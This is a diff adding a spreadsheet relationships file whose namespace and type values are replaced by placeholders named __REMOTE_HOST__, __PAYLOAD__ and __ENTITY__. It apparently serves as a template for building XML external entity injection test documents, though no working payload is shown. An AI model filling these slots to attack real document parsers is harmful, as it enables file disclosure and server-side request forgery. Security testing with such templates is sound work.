@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+__PAYLOAD__
+<Relationships xmlns="__REMOTE_HOST__"><Relationship Id="rId3" Type="__REMOTE_HOST__" Target="docProps/app.xml">__ENTITY__</Relationship><Relationship Id="rId2" Type="__REMOTE_HOST__" Target="docProps/core.xml"/><Relationship Id="rId1" Type="__REMOTE_HOST__" Target="xl/workbook.xml"/></Relationships>
